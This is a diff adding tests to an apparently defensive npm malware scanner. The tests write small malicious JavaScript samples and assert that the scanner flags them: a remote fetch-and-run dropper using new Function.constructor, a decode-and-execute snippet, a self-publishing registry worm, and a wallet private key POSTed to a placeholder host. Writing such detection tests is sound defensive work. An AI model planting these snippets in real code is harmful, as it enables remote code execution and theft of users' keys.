@@ -11477,6 +11477,122 @@ class TestTheSameActsInAnotherEcosystem:
         )
         assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in flagged(tmp_path)
 
+    def test_a_fetch_awaited_into_a_variable_then_run(self, tmp_path) -> None:
+        """`chai-smart-assert`, `chai-chain-test`, `chain-async-test`,
+        `cookie-parseflow` and the rest of a 2026 typosquat family are three
+        lines each:
+
+            const s = (await axios.get(src, { headers: { [k]: v } })).data.config;
+            const handler = new Function.constructor("require", s);
+            handler(require);
+
+        Cordon reported nothing in any of them, for two reasons that had to be
+        fixed together. `new Function.constructor(...)` is `new Function(...)` --
+        every function's constructor is the `Function` constructor -- and no
+        execute primitive matched it. And `SUSPECT.DROPPER.001` requires a third
+        signal beyond egress and execute, deliberately, because that pair on its
+        own describes every deploy script ever written; the signals it accepts
+        are a decode, an install hook, or `fetch_exec`, and these packages have
+        a plaintext URL and run on `require` rather than on install."""
+        (tmp_path / "swap.js").write_text(
+            'const axios = require("axios");\n'
+            "(async function go() {\n"
+            '  const s = (await axios.get("https://jsonkeeper.com/b/ADPEC")).data.config;\n'
+            '  const handler = new Function.constructor("require", s);\n'
+            "  handler(require);\n"
+            "})();\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.DROPPER.001" in blocking(tmp_path)
+
+    def test_constructor_is_the_function_constructor(self, tmp_path) -> None:
+        """The narrower half on its own, shown through a rule that needs the
+        execute primitive: decode plus execute is `SUSPECT.DECODE_EXEC.001`,
+        and it cannot fire unless `new Function.constructor` counts as
+        execution."""
+        (tmp_path / "a.js").write_text(
+            'const src = atob("Y29uc29sZS5sb2coMSk=");\n'
+            'const f = new Function.constructor("require", src);\n'
+            "f(require);\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+
+    def test_two_long_arrays_do_not_make_a_file_minified(self, tmp_path) -> None:
+        """`budi-kue16-riris` is a registry-spam worm: generate a name from two
+        word lists, rewrite `package.json`, `exec('npm publish')`, repeat. The
+        word lists are two very long array literals at the top of the file, and
+        a `.js` file with one long line in it was "minified output" -- so the
+        whole worm inherited the ceiling and
+        `SUSPECT.REGISTRY.SELF_PUBLISH.001` came out at MEDIUM. About thirty
+        packages of that family sit in the npm corpus, every one under the gate
+        for the same reason.
+
+        A minifier deletes newlines; that is its entire purpose. Its output is
+        one line or three, and the mean line length is most of the file. Source
+        somebody typed averages nearer forty bytes a line however long its
+        longest line happens to be."""
+        names = ", ".join(f'"{w}{i}"' for i, w in enumerate(["andi", "budi", "cindy"] * 200))
+        body = "\n".join(f"  const v{i} = step{i}(a, b);" for i in range(120))
+        (tmp_path / "auto.js").write_text(
+            "const { exec } = require('child_process');\n"
+            f"const names = [{names}];\n"
+            f"const foods = [{names}];\n"
+            "function publishNext(name) {\n"
+            f"{body}\n"
+            "  exec('npm publish --access public', () => publishNext(name + 'x'));\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in blocking(tmp_path)
+
+    def test_a_real_bundle_is_still_minified(self, tmp_path) -> None:
+        """The other direction, so the fix above does not simply remove the
+        ceiling. A bundle is long lines and almost nothing else."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        bundle = ("var a=1,b=2,c=3;" * 400 + "\n") * 3
+        content = FileContent(
+            path="dist/app.min.js", raw=bundle.encode(), size=len(bundle.encode())
+        )
+        assert CapabilityDetector._is_minified(content)
+
+    def test_key_material_next_to_a_network_call(self, tmp_path) -> None:
+        """The shape `@solana/web3.js` 1.95.7 was compromised with: read the
+        secret key, send it out. Cordon found nothing in that package, because
+        `credential` meant an environment variable or a credential file and a
+        private key in a variable is neither."""
+        (tmp_path / "steal.js").write_text(
+            "async function backup(wallet) {\n"
+            "  const privateKey = wallet.secretKey;\n"
+            '  await fetch("https://collector.invalid/k", {\n'
+            '    method: "POST",\n'
+            "    body: JSON.stringify({ k: privateKey })\n"
+            "  });\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.WALLET_KEY.001" in flagged(tmp_path)
+
+    def test_proximity_is_not_defeated_by_a_minifier(self, tmp_path) -> None:
+        """Proximity is a line count, and a minifier deletes lines.
+
+        On `dist/ethers.min.js` the whole library is line 1, so "within five
+        lines" meant "anywhere in the file", and the most used Ethereum library
+        there is came out as private key material sent to the network at
+        CRITICAL -- twice. A MALICIOUS composite is deliberately exempt from the
+        minified ceiling, because malware is not excused for being generated, so
+        nothing downstream would have caught it either.
+
+        A window now has to be short in bytes as well as in lines."""
+        filler = ";".join(f"var v{i}=f{i}(a{i},b{i})" for i in range(400))
+        (tmp_path / "lib.min.js").write_text(
+            "var privateKey=w.secretKey;" + filler + ';fetch("https://rpc.invalid/x");\n',
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.WALLET_KEY.001" not in flagged(tmp_path)
+
     def test_the_expensive_sweeps_run_last(self) -> None:
         """The per-file budget is checked between detectors and keeps what has
         already run, so the order of the list decides what a large file gets
